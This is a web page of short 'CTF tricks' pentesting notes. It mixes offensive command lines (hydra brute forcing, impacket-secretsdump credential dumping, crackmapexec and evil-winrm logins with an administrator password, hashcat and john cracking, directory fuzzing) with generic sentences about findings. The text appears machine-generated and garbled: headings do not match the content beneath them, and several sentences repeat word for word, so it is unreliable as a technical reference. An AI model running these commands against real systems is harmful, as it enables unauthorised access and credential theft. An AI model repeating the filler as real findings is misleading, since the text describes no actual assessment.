---
TitleSEO: "Common CTF Tricks and Techniques | ZureFX"
TitlePost: "Common CTF Tricks and Techniques"
Author: "ZureFX"
Description: "Personal notes on Common CTF Tricks and Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "malware, networking, dfir, linux, privilege escalation"
URL: "https://zurefx.github.io/notes/note-common-ctf-tricks-and-techniques-468.html"
URL_IMAGES: ""
Date: "2024-08-14"
Tags: "Malware, Networking, DFIR, Linux, Privilege Escalation"
Section: "notes"
Lang: "en"
main_img: "note-common-ctf-tricks-and-techniques-468"
Permalink: "/notes/note-common-ctf-tricks-and-techniques-468.html"
BtnLabel: "Read Notes"
Pick: 0
---
## rpcclient

### sqlmap

The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service. Group Policy Preferences contained encrypted but recoverable credentials.

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file.

## Insecure Deserialization

### NFS

Initial enumeration revealed several interesting open ports on the target. Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service. The target system was identified as running a vulnerable version of the service.

```bash
feroxbuster -h
```

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.16.180.210 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.89.252.29
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.35.78.19 -u administrator -p 'P@ssw0rd!' --shares
```

## sharphound

### Golden Ticket

Authentication bypass was achieved through careful manipulation of the login mechanism. Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services.

The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials.

> **Note:** DCSync was identified as the primary attack vector in this scenario.

```bash
crackmapexec smb 10.34.234.213 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

## GPP Password

### metasploit

```bash
evil-winrm -i 10.60.245.96 -u administrator -p 'P@ssw0rd!'
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.26.229.24/FUZZ
gobuster dir -u http://10.116.225.24/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.80.38.245 -u administrator -p 'P@ssw0rd!' --shares
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The database credentials were hardcoded in the application source code. The target system was identified as running a vulnerable version of the service.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```
